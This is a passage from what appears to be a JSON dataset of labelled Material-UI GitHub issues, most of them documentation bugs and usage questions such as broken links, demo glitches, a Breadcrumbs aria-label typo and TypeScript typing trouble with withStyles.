top\r\n\r\nSee: `e7a255bc - handle &#39;` for correct behavior\r\n\r\n## Current Behavior 😯\r\n- The TOC doesn't update correctly when the page is scrolled quickly\r\n- The fragment isn't removed at the top of the page\r\n\r\nSee: `dee8f264a - add useThrottledScroll` for incorrect behavior\r\n\r\n(I would label it as a regression, but I`m not sure you can have a regression against previously unmerged code! 😄 )\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nLink: https://next.material-ui.com/api/app-bar/#props\r\n\r\n1. Scroll to the bottom\r\n2. Scroll moderately quickly to the top\r\n3. Note that CSS is still highlighted in the TOC\r\n\r\n## Context 🔦\r\n\r\nN/A\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.0-alpha.1  |\r\n| React        |   v16.8    |\r\n| Browser      |  71.0.3578.98  |\r\n\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nThe links in the documentation are working.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nWe mention the bundle size in the following files:\r\n- `/docs/src/pages/system/basics/basics.md` -> link bundlephobia.com, ok\r\n- `/docs/src/pages/demos/drawers/drawers.md` -> link nothing, empirical statement, hum\r\n- `/docs/src/pages/customization/css-in-js/css-in-js.md` -> link nothing, empirical statement, hum\r\n- `/docs/src/pages/utils/popper/popper.md` -> link .size-limit.js, broken\r\n- `/docs/src/pages/layout/use-media-query/use-media-query.md` -> link .size-limit.js, broken\r\n- `/docs/src/pages/guides/minimizing-bundle-size/minimizing-bundle-size.md` link .size-limit.js, broken\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nNavigate to https://next.material-ui.com.\r\n\r\n## Context 🔦\r\n\r\nThe links were broken with #14587.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.0-alpha.1  |\r\n"},{"labels":[null,"documentation",null],"text":"I'm not sure if it's the supposed behavior, but it seems that typography is a bit unintuitive and maybe even buggy.\r\n\r\nWhen changing between dark/light themes, the font-color calculations are right 95% of the time. But some places it just doesn't want to, resulting in several minutes of configuration and having to manually control colors on some components.\r\n\r\nThe best example I have of this right now, as I'm usually fine with writing a couple lines of code (and don't have better examples) is on the material-ui.com website itself! I was quite surprised when I found it because I've noticed gradual improvement with typography and thought this was one of the things that got fixed.\r\n\r\nI believe a `contrast` or boolean for dark/light background prop on typography would save a bunch of time in the long run. Performance might take a hit though?\r\n\r\n- [x] This is not a v0.x issue.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\n1. White text on dark backgrounds and vice versa.\r\n2. Not configuring typography colors when using several themes\r\n\r\n\r\n## Current Behavior 😯\r\n\r\n1. White text on white backgrounds and vice versa (sometimes).\r\n2. Configuring typography colors when using several themes\r\n\r\n## Steps to Reproduce 🕹\r\n1. Go to the [website color tool](https://material-ui.com/style/color/#color-tool) and choose the dark theme with 'orange' as primary and whatever secondary color.\r\n\r\n1. Look in the top left corner... That 'Material-UI' is completely dark on a #424242 (dark) background.\r\n1. Go to https://material-ui.com/style/typography/#theme and look on the text with button-text styling\r\n\r\n\r\n\r\n## Context 🔦\r\n\r\nBuilding themes and components become tiresome when things like typography have to be configured; even though it works most of the time and is super great.\r\n\r\n## Your Environment 🌎\r\n\r\nWhere Material-UI is displayed."},{"labels":[null,"documentation",null],"text":"Internal links in the documentation pages are not working properly in Firefox - any mouse button click causes the navigation to happen, including middle-click and right-click. This problem does not happen in Chromium.\r\n\r\nThis only affects the links in the body of the documentation, not the links in the sidebar.\r\n\r\nTested in Firefox 65.0 Linux (with a clean profile and no addons) and Chromium 71.0.3578.98 Linux."},{"labels":["documentation",null],"text":"https://material-ui.com/demos/dialogs/\r\n\r\nthe dialog which should show a demo of scrolling content does not show the scrollbar. I use a regular 4K monitor. There should be more content inside the dialog to make it clear. \r\n\r\n![image](https://user-images.githubusercontent.com/2733862/53162941-bacfd680-35d5-11e9-9eb5-842c75ba09aa.png)\r\n"},{"labels":["documentation"],"text":"I'm looking through the Onepirate landing page example as a launching point and I'm not understanding how the links in AppAppBar and AppFooter are working.\r\n\r\nThe Source for the onepirate example is here:\r\nhttps://github.com/mui-org/material-ui/tree/master/docs/src/pages/premium-themes/onepirate\r\n\r\nExpected:\r\nDownload the example and have it work.\r\n\r\nObserved:\r\n\r\n* 404 to Terms, Privacy, Sign-In, etc...\r\n* Many other files not within the example folder such as (all images, and some other components.) \r\n\r\nI've gathered up the files not in the source directory, but I'm looking for a straight-forward way to fix the 404s.\r\n\r\nFor example this link to the terms in `./modules/views/AppFooter.js`\r\n\r\n    <li className={classes.listItem}>\r\n        <Link href=\"/premium-themes/onepirate/terms\">Terms</Link>\r\n    </li>\r\n\r\nYou will note two things:\r\n\r\n1. The link is to /premium-themes/ not to files in the source directory linked to from the Premium Themes library\r\n1. There is not router in the example\r\n\r\nI've tried moving the Terms.js from my src into into /src/modules and putting the terms.js into src and \r\nchanged the href to '/terms' but I still get 404s.\r\n\r\nIt seems as though this example is not really reusable as-is, but I'm not sure. Do I need to re-work the example using react-router-dom or is there some other more straight-forward approach I'm not seeing.\r\n\r\nI'm dropping this into a vanilla create-react-app project and serving it up with AWS Amplify hosting.\r\n\r\n    Module Versions: \r\n    +-- @material-ui/core@3.9.2\r\n    +-- @material-ui/icons@3.0.2\r\n    +-- aws-amplify@1.1.19\r\n    +-- aws-amplify-react@2.3.0\r\n    +-- clsx@1.0.3\r\n    +-- prop-types@15.7.2\r\n    +-- react@16.8.2\r\n    +-- react-dom@16.8.2\r\n    +-- react-router-dom@4.3.1\r\n    `-- react-scripts@2.1.5"},{"labels":[null,"documentation"],"text":"Popup asking site visitor to help translate spams visitor with notifications\r\n\r\n![screenshot](https://i.imgur.com/Q7x7I3H.png)\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nVisitor should be spammed at most once with dropdown popup to help translate—ideally targeted at locales that would be able to help with a language.\r\n\r\n## Current Behavior 😯\r\nVisitor spammed repeatedly with all language dropdown thingies.\r\n\r\n## Steps to Reproduce 🕹\r\nVisit [https://material-ui.com](https://material-ui.com)\r\n\r\n## Context 🔦\r\nAnnoying\r\n\r\n## Your Environment 🌎\r\nMac OSX Chrome Version 72.0.3626.109 (Official Build) (64-bit)\r\n"},{"labels":[null,"documentation",null],"text":"When using CSS API for ExpansionPanelSummary `expanded` class name is applied to both ButtonBase and ExpandIcon. According to docs, it should be applied to only root element.\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nExpansionPanelSummary `expanded` class name should be applied to only ButtonBase (which is root component).\r\n\r\n## Current Behavior 😯\r\nExpansionPanelSummary `expanded` class name is applied to both ButtonBase, container element, and ExpandIcon.\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n\r\n\r\n## Context 🔦\r\nI am trying to implement a summary on bottom panel when it is expanded. This behavior blocks me as I want to use absolute positioning.\r\n\r\n## Your Environment 🌎\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n| React        | v16.8.1 |\r\n| Browser      | Chrome, Firefox |\r\n| TypeScript   | Not used |\r\n"},{"labels":[null,"documentation"],"text":"className prop is not documented in IconButton. Looks like it was deliberately tagged to be ignored. \r\nWhy would this is be if it is merged with other component classes in the end?\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior\r\nWe have consistency in the way className is passed in other components, we can do it here, but it's not documented on the website. \r\n\r\n## Current Behavior 😯\r\nhttps://github.com/mui-org/material-ui/blob/a82ab04d6aa5587f401d6cf5a7b6ef05ed681ae1/packages/material-ui/src/IconButton/IconButton.js#L135\r\n"},{"labels":["documentation",null,null],"text":"Hello everyone, can't figure out how to solve this so I'm asking for your help :) \r\n\r\nUsing typescript + react + material-ui (latest versions at the time of writing, cf package.json in repo, link at the bottom).  \r\n\r\nCan't share the real code but made a small project to reproduce my problem.\r\n\r\nI have a generic class like so:  \r\n\r\n```typescript\r\nimport * as React from 'react';\r\nimport { Theme, withStyles } from '@material-ui/core/styles';\r\nimport { WithStyles, createStyles, Typography } from '@material-ui/core';\r\n\r\nconst styles = (theme: Theme) =>\r\n  createStyles({\r\n    typo: {\r\n      width: '100%',\r\n    },\r\n  });\r\n\r\ntype TestCompWithStyleProps<T> = {\r\n  text: string;\r\n  onClick?: (arg: T) => void;\r\n} & WithStyles<typeof styles>;\r\n\r\nexport class TestComp<T> extends React.Component<TestCompWithStyleProps<T>> {\r\n  render() {\r\n    const { classes, text } = this.props;\r\n    return <Typography className={classes.typo}>{text}</Typography>;\r\n  }\r\n}\r\n\r\nexport const TestCompWithStyle = withStyles(styles)(TestComp);\r\n``` \r\n\r\nThe aim here is to be able to have typings in the onClick callback function.  \r\n(kind of like what apollo-client is doing with Query && Mutation components).   \r\n\r\nIt is used like this:  \r\n\r\n```typescript\r\nimport React, { Component } from 'react';\r\nimport logo from './logo.svg';\r\nimport './App.css';\r\nimport { TestComp, TestCompWithStyle } from './TestComp';\r\n\r\n// ok\r\nclass TestCompChild extends TestComp<{ someVal: string }> {}\r\n\r\n// Type error: Type 'ComponentType<Pick<TestCompWithStyleProps<{}>, \"text\" | \"onClick\"> & StyledComponentProps<\"typo\">>' is not a constructor function type.  TS2507\r\nclass TestCompWithStyleChild extends TestCompWithStyle<{ someVal: string }> {}\r\n\r\nclass App extends Component {\r\n  render() {\r\n    return (\r\n      <div className=\"App\">\r\n        <header className=\"App-header\">\r\n          <img src={logo} className=\"App-logo\" alt=\"logo\" />\r\n          <p>\r\n            Edit <code>src/App.tsx</code> and save to reload.\r\n          </p>\r\n          <a\r\n            className=\"App-link\"\r\n            href=\"https://reactjs.org\"\r\n            target=\"_blank\"\r\n            rel=\"noopener noreferrer\"\r\n          >\r\n            Learn React\r\n          </a>\r\n        </header>\r\n\r\n        <TestCompChild\r\n          classes={{ typo: 'toto' }}\r\n          text=\"Hello from comp\"\r\n          onClick={val => {\r\n            val.someVal; // ok\r\n            val.test; // error type as expected\r\n          }}\r\n        />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default App;\r\n```\r\n\r\nAs you can see, it works fine when I extend the \"original\" component (not wrapped withStyles).   \r\nI get the typing I need in the onClick call prop.  \r\nBut I can't make it work with the wrapped component (with \"withStyles\").\r\nI get the error in the comment.  \r\nAny idea ? thx :)\r\n\r\nPS: here is the repo which reproduce my problem, if you want to run it yourself (create-react-app typescript + material-ui https://github.com/nihaux/typescript-generic-material-ui-withstyle)\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"https://material-ui.com/demos/cards/#complex-interaction\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nComplex interaction demo should work\r\n\r\n## Current Behavior 😯\r\nIt's broken.\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/6jk2q6yppz\r\n\r\n"},{"labels":[null,"documentation"],"text":"On the [showcase](https://material-ui.com/discover-more/showcase/) page, some links/descriptions of the projects are mixed up with the images.\r\n\r\nThis might be because of the \"sorting by\" feature ?\r\n\r\nSome examples in snapshots:\r\n\r\n<img width=\"635\" alt=\"capture d ecran 2019-02-11 a 08 54 44\" src=\"https://user-images.githubusercontent.com/985982/52551015-f5b65b00-2dda-11e9-9c33-2a2c8800da41.png\">\r\n<img width=\"747\" alt=\"capture d ecran 2019-02-11 a 08 53 24\" src=\"https://user-images.githubusercontent.com/985982/52551016-f8b14b80-2dda-11e9-8f90-c7d444b63c8a.png\">\r\n"},{"labels":[null,null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe documentation section for Breadcrumbs state the following (under \"Accessibility\"):\r\n> Be sure to add a aria-label description on the Breadcrumbs component.\r\n\r\nHowever, in the actual code demos for Breadcrumbs, the property used is \"arial-label\". Possible typo? If so, probably the result of copy/paste\r\n\r\n* SimpleBreadcrumbs demo: Lines [29](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/lab/breadcrumbs/SimpleBreadcrumbs.js#L29) and [41](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/lab/breadcrumbs/SimpleBreadcrumbs.js#L41)\r\n* CustomSeparator: Lines [31](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/lab/breadcrumbs/CustomSeparator.js#L31), [43](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/lab/breadcrumbs/CustomSeparator.js#L43), [55](https://github.com/mui-org/material-ui/blob/master/docs/src/pages/lab/breadcrumbs/CustomSeparator.js#L55),\r\n* etc...\r\n\r\n- [x] This is not a v0.x issue. \r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nCode in demos should say `<Breadcrumb aria-label=\"Breadcrumb\">`\r\n\r\n## Current Behavior 😯\r\nCode in demos say `<Breadcrumb arial-label=\"Breadcrumb\">`\r\n\r\n## Steps to Reproduce 🕹\r\nLook at the code of any demo in [Lab/Breadcrumbs](https://material-ui.com/lab/breadcrumbs/)\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n"},{"labels":[null,"documentation",null],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Examples 🌈\r\nSome sites have an \"avatar within an avatar\" that looks something like this.\r\n<img width=\"55\" alt=\"screen shot 2019-02-06 at 7 52 54 pm\" src=\"https://user-images.githubusercontent.com/53399/52389605-1a13df80-2a49-11e9-9d23-c3ff829cf7ff.png\">\r\n\r\n## Context 🔦\r\nThis MD pattern is often used when you have something like a personal user and organizations they have access to. e.g. On DigitalOcean the pattern is used with a team avatar as the main avatar and your personal avatar as the sub avatar when you are using a team account's resources instad of your personal account's resources.\r\n\r\n## Implementation notes\r\nCSS Tricks has some good notes on clipping: https://css-tricks.com/clipping-masking-css/\r\n\r\nI think it should be possible to clip the main avatar in a way that works in all browsers (instead of hardcoding a background color to fake the clipping) if we switch the main avatar to be rendered using SVG instead of HTML."},{"labels":["documentation",null],"text":"Here under the label of \"Customized selects\" there is a \"Select\" of age that is not a selective component, its just an input: https://material-ui.com/demos/selects/\r\n\r\nSo it makes me wonder why its there.\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nI'm trying to use the sample code for an app bar provided in the [documentation](https://material-ui.com/demos/app-bar/#app-bar-with-a-primary-search-field) (note that I'm not using the AppBar component- I have my own header component. But I'm currently trying to create a SearchField component based on this code). I've basically cut and pasted the code as-is, and pulled out the parts not related to the search field. I'm getting an error: `Uncaught TypeError: Cannot read property 'borderRadius' of undefined`. Digging into it, I see that the theme object being passed into the function I pass into makeStyles is an empty object. I investigated further, to see if I could get my hands on the theme. When I export my component with withTheme()(searchBar), the theme object in the props is null. Likewise, if I just call useTheme() in my component, it also returns null.\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\nNote: it seems the plain JS sample code (no hooks) works - so this has something to do with the Material-UI and React 16.8.0-alpha.1. However- this version is required to use the sample hooks code.\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nMy makeStyles function should be passed the populated theme object, and withTheme and useTheme should return the proper non-null theme object.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe theme object passed into makeStyles is empty. The theme props attribute injected by withTheme is null.  The theme object returned by useTheme is null.\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: I don't have a live link but it's easy to reproduce:\r\n\r\n1. create-react-app testy\r\n2. cd testy\r\n3. Modify package.json, setting the react and react-dom versions to ^16.8.0-alpha.1 (to make use of hooks)\r\n```\r\n    \"react\": \"^16.8.0-alpha.1\",\r\n    \"react-dom\": \"^16.8.0-alpha.1\",\r\n```\r\n4. npm install (to update react)\r\n5. npm install --save @material-ui/core @material-ui/styles @material-ui/icons\r\n6. Copy the Hooks version of the Sample [App Bar with a primary search field](https://material-ui.com/demos/app-bar/#app-bar-with-a-primary-search-field)\r\n7. Paste this code into the test app's /src/App.js file (overwrite the existing code) and save\r\n6. npm start - you will get an undefined error when the makeStyles function accesses the empty theme object\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm trying to implement a toolbar in my app with Material-UI.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n| React        |   16.8.0-alpha.1      |\r\n| Browser      |    Chrome 71.0    |\r\n| TypeScript   |  3.3.0-rc       |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"In [Breadcrumbs API](https://material-ui.com/lab/api/breadcrumbs/#css-api), the **CSS API** section is missing while it should document `\"root\"` / `\"ol\"` / `\"separator\"` classes.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe **CSS API** section should exist and document `\"root\"` / `\"ol\"` / `\"separator\"` classes.\r\n\r\n## Current Behavior 😯\r\n\r\nThere is no **CSS API** section.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nLink:\r\n\r\n1. [Breadcrumbs API](https://material-ui.com/lab/api/breadcrumbs/)\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |"},{"labels":[null,"documentation",null],"text":"_Removing boilerplate as it isn't useful I think._\r\n\r\n3.9.1 is the latest release that I can see.  When I go to the main documentation page, it only gives me 3.9.0, no matter how much I reload or close tab open new tab, all the things that should get a service worker to skipWaiting and install the new version.\r\n\r\nI went into Application in dev tools and unregistered the SW.  Reload, I can see 3.9.1 and I can see it install the SW.\r\n\r\nReload again, and I'm back to seeing only 3.9.0.\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe error messages can be seen in the Chrome browser console window.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nAdding \"&$\" in front of the \"Selected\" should fix the problem\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nA new error message appears.  See code sandbox.\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/mj9x1zy4j9\r\n\r\n1.\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nTrying to modify the css on a MUI tab\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.1  |\r\n| React        |  16.7       |\r\n| Browser      |    Chrome     |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null,null],"text":"I tried providing a function as children to `Grow`:\r\n\r\n```js\r\n                <Grow in={showSaveUi}>\r\n                  {(transitionState) => {\r\n                    return (\r\n                      <div>\r\n                        div content...\r\n                      </div>\r\n                    );\r\n                  }}\r\n                </Grow>\r\n```\r\n\r\nbut then I get:\r\n\r\n```\r\nInvariant Violation: Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.\r\n```\r\n\r\nI believe its because of this line: https://github.com/mui-org/material-ui/blob/bb0891882fe62a092116aa96e738dce91b703cda/packages/material-ui/src/Grow/Grow.js#L123\r\n\r\nThe prop types say that you can provide a function as children: https://github.com/mui-org/material-ui/blob/next/packages/material-ui/src/Grow/Grow.js#L142\r\n\r\nShould the render code be changed so that you can access the transition state by providing a function `children` prop or should the prop-types be changed?\r\n\r\nIf we cant make it possible to send in a function as `children` is there some other way to access the transition state? I wonder if just providing the transitionState value as a prop in the `cloneElement` execution would work? 🤔\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.0  |\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe how it should work.\r\n-->\r\nI don't know if it would be a theme thing or some kind of Consumer/Provider setup but `p` is not a great default component for FormHelperText, especially given that it is often used for error messages that could have multiple parts and you would naturally want to nest a `ul` in the helper text. So a DRY, global means to set this component would be a huge help.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Explain the difference from current behavior.\r\n-->\r\nTo my knowledge, you can only set the `component` property of `FormHelperText` on each instance.\r\n\r\n## Examples 🌈\r\n<!---\r\n    Provide a link to the Material design specification, other implementations,\r\n    or screenshots of the expected behavior.\r\n-->\r\nN/A\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nLooking to nest `ul` and/or `div` in **all** instances of `FormHelperText` in a DRY manner.\r\n"},{"labels":["documentation"],"text":"I don't really understand what this means:\r\n\r\n> However, this strategy suffers from a little limitation: properties collision. The component providing the component property (e.g. ListItem) might not forward all its properties to the root element (e.g. dense).\r\n\r\nThe `dense` property is consumed by `ListItem` and `ListItem`'s code doesn't seem to pass `dense` along to the `component` element it creates, so I'm not sure I understand what this warning is trying to say.  It doesn't seem like there would be any problems related to `dense`.\r\n\r\nMaybe there's a different prop that would actually have a problem, that would make a better example to illustrate the difficulties `component={Link}` can cause?  I've been using `component={Link}` in my own code with seemingly no trouble 😟 "},{"labels":["documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nThe title in the /css-in-js/api/ styled section should match the implementation, just like the example does.  \r\n\r\n## Current Behavior 😯\r\nThe order of arguments are wrong in the title.\r\n\r\n## Steps to Reproduce 🕹\r\nLink:\r\n1. https://material-ui.com/css-in-js/api/\r\n\r\n## Context 🔦\r\nNot needed.\r\n\r\n## Your Environment 🌎\r\nbrowser\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.1  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nFontAwesome Icons should be rendered.\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n![image](https://user-images.githubusercontent.com/22003061/51830453-2b921480-22f0-11e9-8569-a9782805bebb.png)\r\n\r\n\r\n## Steps to Reproduce 